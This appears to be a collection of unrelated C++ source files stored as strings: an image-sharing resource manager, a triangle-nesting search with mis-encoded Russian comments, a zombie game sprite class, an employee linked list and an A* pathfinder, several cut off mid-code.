    "#include <mutex>\n#include \"../hpp/resourceManager.hpp\"\n#include \"sstream\"\n#include <fstream>\n\nnamespace pokemon {\n    ResourceManager *ResourceManager::resourceManager = nullptr;\n    std::mutex ResourceManager::mutex;\n\n    ResourceManager &ResourceManager::getInstance() {\n        std::lock_guard<std::mutex> lock(mutex);\n\n        if (!resourceManager)\n            resourceManager = new ResourceManager();\n        return *resourceManager;\n    }\n\n    void ResourceManager::addPicture(const std::string &pictureName, const std::string &extention, const std::string &pictureHash,\n                              const std::string &owner) {\n        std::lock_guard<std::mutex> lock(mutex);\n        pictureList_mp.insert({pictureName, {owner, extention, pictureHash}});\n    }\n\n\n    void ResourceManager::tracePicturesList(std::ostream &os) const {\n        std::lock_guard<std::mutex> lock(mutex);\n        trace.print(os, \" -- Liste des images -- \");\n        for (auto &picture: pictureList_mp)\n            trace.print(os, picture.first + \" -> { \" + std::get<0>(picture.second)\n                            + \" , \" + std::get<1>(picture.second) + \" , \" + std::get<2>(picture.second) + \" }\");\n        trace.print(os, \"Size: \" + std::to_string(pictureList_mp.size()));\n    }\n\n    void ResourceManager::printPokemonPictures(std::ostream &os) const {\n        std::lock_guard<std::mutex> lock(mutex);\n        os <<std::endl;\n        os << \" -- Liste des images -- \" << std::endl;\n\n        // <nomImage, {ipOwner, extention, pictureHash} >\n        for (auto &picture: pictureList_mp)\n            os << picture.first << \" : \" << std::get<2>(picture.second) << std::endl;\n        os << \"Size: \" + std::to_string(pictureList_mp.size()) << std::endl<<std::endl;\n    }\n\n    std::optional<std::tuple<std::string, std::string, std::string>>\n    ResourceManager::findPicture(const std::string &name) const {\n        std::lock_guard<std::mutex> lock(mutex);\n\n        auto picture = pictureList_mp.find(name);\n        if (picture != pictureList_mp.end()) // Si l'image est trouv\u00e9e, retourner un tuple avec les valeurs appropri\u00e9es\n            return picture->second;\n        else // Si l'image n'est pas trouv\u00e9e, retourner un std::nullopt*\n            return std::nullopt;\n    }\n\n    std::unordered_map<std::string, std::tuple<std::string, std::string, std::string>>\n    ResourceManager::getPicturesList() const {\n        std::lock_guard<std::mutex> lock(mutex);\n        return pictureList_mp;\n    }\n\n    void ResourceManager::addNode(const std::string &ip) {\n        std::lock_guard<std::mutex> lock(mutex);\n        auto it = std::find(nodesList_v.begin(), nodesList_v.end(), ip);\n\n        // Si l'adresse IP n'est pas trouv\u00e9e, l'ajouter\n        if (it == nodesList_v.end()) {\n            nodesList_v.push_back(ip);\n        }\n    }\n\n    std::vector<std::string> ResourceManager::getNodesList() const {\n        std::lock_guard<std::mutex> lock(mutex);\n        return nodesList_v;\n    }\n\n    int ResourceManager::savedPictureToDisk(const std::string &location,  const std::string &pictureName, std::string &extension, const std::string &pic_str) {\n        std::lock_guard<std::mutex> lock(mutex);\n        try{\n            if (!std::filesystem::is_directory(location) || !std::filesystem::exists(location))\n                std::filesystem::create_directory(location);\n\n            std::ofstream MyPic(location + pictureName + \".\" + extension);\n            MyPic << pic_str;\n            MyPic.close();\n        }\n        catch (const std::exception &e){\n            trace.print(std::cerr, \"Error can't save < \" + pic_str + \" > \" );\n            return 1;\n        }\n        return 0;\n    }\n\n\n    void ResourceManager::printNodesList(std::ostream &os) const {\n        std::lock_guard<std::mutex> lock(mutex);\n        os <<std::endl;\n        os << \" -- Liste des nodes -- \" << std::endl;\n        for (auto &node: nodesList_v)\n            os << node << std::endl;\n        os << \"nombres totals: \" + std::to_string(nodesList_v.size()) << std::endl <<std::endl;\n    }\n\n    std::optional<std::string> ResourceManager::findNode(const std::string &ip) const {\n        std::lock_guard<std::mutex> lock(mutex);\n\n        auto node = std::find(nodesList_v.begin(), nodesList_v.end(), ip);\n        if (node != nodesList_v.end()) // Si le est trouv\u00e9e, retourner l'ip\n            return *node;\n        // Si le node n'est pas trouv\u00e9e, retourne nullopt\n        return std::nullopt;\n    }\n\n    void ResourceManager::addPicturePath(const std::string &picturePath) {\n        picturePath_s = picturePath;\n    }\n\n    std::tuple<std::string, std::string> ResourceManager::getNameAndExtension(const std::string &pictureHash) {\n        std::lock_guard<std::mutex> lock(mutex);\n        auto it = pictureList_mp.find(pictureHash);\n        if (it != pictureList_mp.end()) {\n            const auto &info = it->second;\n            return std::make_tuple(std::get<0>(info), std::get<1>(info)); // R\u00e9cup\u00e8re l'extension et le nom\n        }\n        return std::make",
    "// \u00cd\u00e0\u00e9\u00f2\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00f1 \u00e2\u00e5\u00f0\u00f8\u00e8\u00ed\u00e0\u00ec\u00e8 \u00e2 \u00e7\u00e0\u00e4\u00e0\u00ed\u00ed\u00ee\u00ec \u00ec\u00ed\u00ee\u00e6\u00e5\u00f1\u00f2\u00e2\u00e5 \u00e8\u00e7 n \u00f2\u00ee\u00f7\u00e5\u00ea \u00ed\u00e0\n// \u00ef\u00eb\u00ee\u00f1\u00ea\u00ee\u00f1\u00f2\u00e8 \u00f2\u00e0\u00ea, \u00f7\u00f2\u00ee\u00e1\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00eb\u00e5\u00e6\u00e0\u00eb \u00f1\u00f2\u00f0\u00ee\u00e3\u00ee \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee, \u00e0\n// \u00f2\u00f0\u00e5\u00f2\u00e8\u00e9 \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee.\n\n#include <iostream>\n#include <Windows.h>\n#include <fstream>\n#include<array>\n\nusing namespace std;\n\n//\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00f2\u00ee\u00f7\u00ea\u00e0\nstruct Point\n{\n\tdouble x, y;\n};\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00ea\u00eb\u00e0\u00e2\u00e8\u00e0\u00f2\u00f3\u00f0\u00fb\npair<Point*, int> Rkey()\n{\n\tint n;\n\tcout << endl << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f2\u00ee\u00f7\u00e5\u00ea \u00e2 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e5:  \";\n\tcin >> n;\n\tPoint* mas = new Point[n];\n\tcout << endl;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 x \u00e8 y \u00f2\u00ee\u00f7\u00ea\u00e8 [\"<<i+1<<\"]: \";\n\t\tcin >> mas[i].x;\n\t\tcin >> mas[i].y;\n\t}\n\treturn make_pair(mas, n);\n}\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00f4\u00e0\u00e9\u00eb\u00e0\npair<Point*, int> Rfile()\n{\n\tifstream fin(\"input.txt\");\n\tint N, k;\n\tint A[1000];\n\tPoint* mas;\n\tif (!fin.good())\n\t{\n\t\tcout << \"\u00d4\u00e0\u00e9\u00eb input.txt \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed!\" << endl;\n\t}\n\telse\n\t{\n\t\tk = 0;\n\t\twhile (fin >> N)\n\t\t{\n\t\t\tA[k++] = N;\n\t\t}\n\t\tmas = new Point[k / 2];\n\t\tfor (int i = 0; i < k; i += 2)\n\t\t{\n\t\t\tmas[i / 2].x = A[i];\n\t\t\tmas[i / 2].y = A[i + 1];\n\t\t}\n\t\tfin.close();\n\t\treturn make_pair(mas, k / 2);\n\t}\n\tfin.close();\n\treturn make_pair(mas, 0);\n}\n\n//\u00e2\u00fb\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f2\u00ee\u00f7\u00e5\u00ea\nvoid writeP(Point* mas,int n)\n{\n\tcout << \"\u00c2\u00f5\u00ee\u00e4\u00ed\u00ee\u00e9 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00f2\u00ee\u00f7\u00e5\u00ea:\" << endl;\n\tfor (int i = 0; i <n; i++)\n\t{\n\t\tcout << \"[\" << mas[i].x << \"; \" << mas[i].y << \"]    \";\n\t}\n\tcout << endl;\n}\n//\u00ff\u00e2\u00eb\u00ff\u00fe\u00f2\u00f1\u00ff \u00eb\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00ee\u00f7\u00ea\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00ec\nbool trian(Point a, Point b, Point c)\n{\n\tdouble lab, lac, lbc;\n\tlab = sqrt(pow((a.x - b.x), 2) + pow((a.y - b.y), 2));\n\tlac = sqrt(pow((a.x - c.x), 2) + pow((a.y - c.y), 2));\n\tlbc = sqrt(pow((b.x - c.x), 2) + pow((b.y - c.y), 2));\n\tif (lab + lac > lbc)\n\t\treturn true;\n\telse\n\t\tif (lab + lbc > lac)\n\t\t\treturn true;\n\t\telse\n\t\t\tif (lac + lbc > lab)\n\t\t\t\treturn true;\n\t\t\telse\n\t\t\t\treturn false;\n}\n\nbool IsPIn_(Point a, Point b, Point c, Point p)\n{\n\tint af = (a.x - p.x) * (b.y - a.y) - (b.x - a.x) * (a.y - p.y);\n\tint bf = (b.x - p.x) * (c.y - b.y) - (c.x - b.x) * (b.y - p.y);\n\tint cf = (c.x - p.x) * (a.y - c.y) - (a.x - c.x) * (c.y - p.y);\n\n\tif ((af > 0 && bf > 0 && cf > 0) || (af < 0 && bf < 0 && cf < 0))\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n//\u00ef\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f5 \u00e2\u00eb\u00ee\u00e6\u00e5\u00ed\u00ed\u00fb\u00f5 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00e2\nvoid serh(Point* mas, int n)\n{\n\tint trian1[3];\n\tint trian2[3];\n\tint trian3[3];\n\tbool ress = false;\n\t//\u00ef\u00e5\u00f0\u00e2\u00fb\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\n\tfor (int i1 = 0; i1 < n - 2; i1++)\n\t{\n\t\tfor (int j1 = i1+1; j1 < n - 1; j1++)\n\t\t{\n\t\t\tfor (int k1 = j1+1; k1 < n; k1++)\n\t\t\t{\n\t\t\t\tif (trian(mas[i1], mas[j1], mas[k1]))\n\t\t\t\t{\n\t\t\t\t\t//\u00cf\u00e5\u00f0\u00e2\u00fb \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\ttrian1[0] = i1; trian1[1] = j1; trian1[2] = k1;\n\t\t\t\t\t//\u00ef\u00ee\u00e8\u00f1\u00ea \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\tfor (int i2 = 0; i2 < n-2 ; i2++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[i2])\n\t\t\t\t\t\t\t&& (i2 !=i1 ) && i2!=j1 &&i2!=k1)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfor (int j2 = i2 + 1; j2 < n - 1; j2++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[j2])\n\t\t\t\t\t\t\t\t\t&& (j2 != i1) && j2 != j1 && j2 != k1)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tfor (int k2 = j2 + 1; k2 < n; k2++)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[k2])\n\t\t\t\t\t\t\t\t\t\t\t&& (k2 != i1) && k2 != j1 && k2 != k1)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i2], mas[j2], mas[k2]))\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\ttrian2[0] = i2; trian2[1] = j2; trian2[2] = k2;\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00cf\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\t\t\t\t\t\t\t\tfor (int i3 = 0; i3 < n - 2; i3++)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[i3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (i3 != i2) && i3 != j2 && i3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int j3 = i3 + 1; j3 < n - 1; j3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[j3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (j3 != i2) && j3 != j2 && j3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int k3 = j3 + 1; k3 < n; k3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[k3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (k3 != i2) && k3 != j2 && k3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i3], mas[j3], mas[k3]))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tress = true;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttrian3[0] = i3; trian3[1] = j3; trian3[2] = k3;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"===============================================\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian1[0]].x << \" \" << mas[trian1[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[1]].x << \" \" << mas[trian1[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[2]].x << \" \" << mas[trian1[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian2[0]].x << \" \" << mas[trian2[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[1]].x << \" \" << mas[trian2[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[2]].x << \" \" << mas[trian2[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee ",
    "#include <iostream>\n#include <atlimage.h>\n#include \"Monster.h\"\n#include \"Zombie1.h\"\n#include \"Collision.h\"\nusing namespace std;\n\n//srand(time(nullptr));\n\nZombie1::Zombie1() : Monster() {\n\thp = 0; // \ub098\uc911\uc5d0 \ud655\uc815\ub418\uba74 \ubc14\uafb8\uae30\n\timageNum = 0;\n\trect = { 1300, 300, 1500, 500 };\n\tleft = false;\n\tbool_attack = false;\n}\n\nRECT Zombie1::getRect() const {\n\treturn rect;\n}\n\nvoid Zombie1::insert() {\n\tif (!zombie1_img.IsNull()) {\n\t\tzombie1_img.Destroy();\n\t}\n\n\tif (left) {\n\t\tif (hp != 0) {\n\t\t\tif (bool_attack)// \uacf5\uaca9\ud560 \ub54c\n\t\t\t\tzombie1_img.Load(zombie1_attack_img_path_L[imageNum]);\n\t\t\telse// \uac4d \uc6c0\uc9c1\uc77c \u008b\u009a\n\t\t\t\tzombie1_img.Load(zombie1_img_path_L[imageNum]);\n\t\t}\n\t\telse// \uc8fd\uc5c8\uc744 \u008b\u009a\n\t\t\tzombie1_img.Load(zombie1_die_img_path_L[imageNum]);\n\t}\n\telse{\n\t\tif (hp != 0) {\n\t\t\tif (bool_attack)// \uacf5\uaca9\ud560 \ub54c\n\t\t\t\tzombie1_img.Load(zombie1_attack_img_path_R[imageNum]);\n\t\t\telse// \uac4d \uc6c0\uc9c1\uc77c \u008b\u009a\n\t\t\t\tzombie1_img.Load(zombie1_img_path_R[imageNum]);\n\t\t}\n\t\telse// \uc8fd\uc5c8\uc744 \u008b\u009a\n\t\t\tzombie1_img.Load(zombie1_die_img_path_R[imageNum]);\n\t}\n}\n\nvoid Zombie1::print(HDC& mDC) {\n\tif (!zombie1_img.IsNull() && (hp != 0 || imageNum != 4)) {\n\t\tzombie1_img.Draw(mDC, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, zombie1_img.GetWidth(), zombie1_img.GetHeight());\n\t}\n}\n\nvoid Zombie1::move(RECT Rect) {\n\tif (hp != 0 || imageNum != 4) {\n\t\t++imageNum;\n\t}\n\n\tif (hp != 0) {\n\t\tif (bool_attack && imageNum == 5) {\n\t\t\t// \uacf5\uaca9\ud560 \ub54c\n\t\t\timageNum = 0;\n\t\t}\n\t\telse if (!bool_attack) {\n\t\t\t// \uac4d \uc6c0\uc9c1\uc77c \u008b\u009a\n\t\t\tif (left) {\n\t\t\t\trect.left -= 4;\n\t\t\t\trect.right -= 4;\n\t\t\t\tif (CheckBlockCollision(Rect, { 0,0,0,0 }, left, rect)) // \ud654\uba74 \ub05d \ub3c4\ub2ec \uc2dc \ubc29\ud5a5 \ubcc0\uacbd\n\t\t\t\t\tleft = false;\n\t\t\t}\n\t\t\telse {\n\t\t\t\trect.left += 4;\n\t\t\t\trect.right += 4;\n\t\t\t\tif (CheckBlockCollision(Rect, { 0,0,0,0 }, left, rect))\n\t\t\t\t\tleft = true;\n\t\t\t}\n\n\t\t\tif (imageNum == 8) {\n\t\t\t\timageNum = 0;\n\t\t\t}\n\t\t}\n\t}\n\telse if (hp == 0 && imageNum == 4) {\n\t\t// \uc8fd\uc5c8\uc744 \u008b\u009a\n\t\tzombie1_img.Destroy();\n\t}\n\n\tif (hp != 0 || imageNum != 4) {\n\t\tinsert();\n\t}\n}\n\nvoid Zombie1::attack(bool status) {\n\tbool_attack = status;\n}\n",
    "#include <iostream>\n#include <locale.h>\n#include <string>\nusing namespace std;\n\nstruct Funcionario {\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n\tFuncionario *prox;\n};\n\nFuncionario* init() {\n\treturn NULL;\n}\n\nbool isEmpty(Funcionario* lista) {\n\treturn (lista == NULL);\n}\n\nFuncionario* insert(Funcionario* lista, int prontuario, string nome, double salario) {\n\tFuncionario* novo = new Funcionario();\n\tnovo->prontuario = prontuario;\n\tnovo->nome = nome;\n\tnovo->salario = salario;\n\tnovo->prox = lista;\n\treturn novo;\n};\n\nvoid printLista(Funcionario* lista) {\n\tFuncionario* aux;\n\tstring line(20, '-');\n\taux = lista;\n\tdouble totalSalarios = 0;\n\tif (isEmpty(lista)) {\n\t\tcout << \"Lista vazia.\" << endl;\n\t} else {\n\t\tcout << \"Lista de funcion\u00e1rios: \\n\" << endl;\n\t\tcout << line << endl;\n\t\twhile (aux != NULL) {\n\t\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t\t\tcout << line << endl;\n\t\t\ttotalSalarios = totalSalarios + aux->salario;\n\t\t\taux = aux->prox;\n\t\t}\n\t\tcout << \"\\nTotal de sal\u00e1rios: \" << totalSalarios << endl;\n\t\tcout << \"\\nFim da lista.\" << endl;\n\t}\n}\n\nvoid printFuncionario(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\tif (aux) {\n\t\tcout << \"\\nFuncion\u00e1rio encontrado: \" << endl;\n\t\tcout << endl;\n\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t} else {\n\t\tcout << \"\\nFuncion\u00e1rio n\u00e3o encontrado.\" << endl;\n\t}\n}\n\nFuncionario* find(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\treturn aux;\n}\n\nFuncionario* remove(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\tFuncionario* ant = NULL;\n\taux = lista;\n\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\tant = aux;\n\t\taux = aux->prox;\n\t}\n\n\tif (aux == NULL) {\n\t\treturn lista;\n\t}\n\n\tif (ant == NULL) {\n\t\tlista = aux->prox;\n\t}\n\n\telse {\n\t\tant->prox = aux->prox;\n\t}\n\n\tfree(aux);\n\treturn lista;\n}\n\nvoid freeLista(Funcionario* lista) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL) {\n\t\tFuncionario *ant = aux->prox;\n\t\tfree(aux);\n\t\taux = ant;\n\t}\t\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"\");\n\t\n  \tFuncionario *listaFuncionarios;\n\tlistaFuncionarios = init();\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n  \tint opcao;\n  \n  \tdo {\n\t\tstring line(40, '-');\n\t\tcout << \"0. Sair\\n\";\n\t\tcout << \"1. Incluir\\n\";\n\t\tcout << \"2. Excluir\\n\";\n\t\tcout << \"3. Pesquisar\\n\";\n\t\tcout << \"4. Listar\\n\";\n\t\tcout << \"Op\u00e7\u00e3o: \";\n\t\tcin >> opcao;\n\n    \t\tswitch (opcao) {\n\t\t\tcase 0:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Encerrando programa...\\n\";\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase 1:\n\t\t\t\tcout << line << endl;\n        \t\t\tcout << \"Digite o prontuario: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tif (find(listaFuncionarios, prontuario)) {\n\t\t\t\t\tcout << \"Funcion\u00e1rio j\u00e1 cadastrado!\\n\";\n\t\t\t\t\tcout << line << endl;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcout << \"Digite o nome: \";\n\t\t\t\tcin >> nome;\n        \t\t\tcout << \"Digite o salario: \";\n\t\t\t\tcin >> salario;\n\t\t\t\tlistaFuncionarios = insert(listaFuncionarios, prontuario, nome, salario);\n        \t\t\tcout << \"Funcion\u00e1rio cadastrado com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 2:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser exclu\u00eddo: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tlistaFuncionarios = remove(listaFuncionarios, prontuario);\n\t\t\t\tcout << \"Funcion\u00e1rio exclu\u00eddo com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\t\t\t\n\t\t\tcase 3:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser pesquisado: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tprintFuncionario(listaFuncionarios, prontuario);\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 4:\n\t\t\t\tcout << line << endl;\n\t\t\t\tprintLista(listaFuncionarios);\n\t\t\t\tcout << line << endl;\n\t\t}  \t\n  } while (opcao != 0);\n\n\tfreeLista(listaFuncionarios);\n\n\treturn 0;\n}\n",
    "#include<vector>\r\n#include<iostream>\r\n#include<queue>\r\n#include<map>\r\n#include<fstream>\r\n#include<sstream>\r\n#include<string>\r\n#include<cmath>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Map_Cell\r\n{\r\n    int type; // \u5730\u56fe\u7684\u7c7b\u578b\uff1a0\u7a7a\u5730\u30011\u969c\u788d\u30012\u8865\u7ed9\u30013\u8d77\u70b9\u30014\u7ec8\u70b9\r\n};\r\n\r\nstruct Search_Cell\r\n{\r\n    int x, y; // \u4f4d\u7f6e\u5750\u6807\r\n    int g; // \u4ece\u8d77\u70b9\u5230\u5f53\u524d\u8282\u70b9\u7684\u5b9e\u9645\u4ee3\u4ef7\r\n    int h; // \u4ece\u5f53\u524d\u8282\u70b9\u5230\u7ec8\u70b9\u7684\u4f30\u8ba1\u4ee3\u4ef7\uff08\u542f\u53d1\u5f0f\uff09\r\n    Search_Cell *parent; // \u7236\u8282\u70b9\r\n\r\n    Search_Cell(int x, int y, int g, int h, Search_Cell* parent = nullptr) : x(x), y(y), g(g), h(h), parent(parent) {}\r\n};\r\n\r\n// \u81ea\u5b9a\u4e49\u6bd4\u8f83\u51fd\u6570\u5bf9\u8c61\uff0c\u6309\u7167 Search_Cell \u7ed3\u6784\u4f53\u7684 g + h \u5c5e\u6027\u8fdb\u884c\u6bd4\u8f83\r\nstruct CompareF {\r\n    bool operator()(const Search_Cell *a, const Search_Cell *b) const {\r\n        return (a->g + a->h) > (b->g + b->h); // \u8f83\u5c0f\u7684 g + h \u503c\u4f18\u5148\u7ea7\u66f4\u9ad8\r\n    }\r\n};\r\n\r\n// \u542f\u53d1\u5f0f\u51fd\u6570\uff0c\u4f7f\u7528\u66fc\u54c8\u987f\u8ddd\u79bb\r\nint Heuristic_Function(int x, int y, int target_x, int target_y) {\r\n    return abs(x - target_x) + abs(y - target_y);\r\n}\r\n\r\nvoid Astar_search(const string input_file, int &step_nums, string &way)\r\n{\r\n    ifstream file(input_file);\r\n    if (!file.is_open()) {\r\n        cout << \"Error opening file!\" << endl;\r\n        return;\r\n    }\r\n\r\n    string line;\r\n    getline(file, line); // \u8bfb\u53d6\u7b2c\u4e00\u884c\r\n    stringstream ss(line);\r\n    int M, N, T;\r\n    ss >> M >> N >> T;\r\n\r\n    pair<int, int> start_point; // \u8d77\u70b9\r\n    pair<int, int> end_point;   // \u7ec8\u70b9\r\n    Map_Cell **Map = new Map_Cell *[M];\r\n    // \u52a0\u8f7d\u5730\u56fe\r\n    for(int i = 0; i < M; i++)\r\n    {\r\n        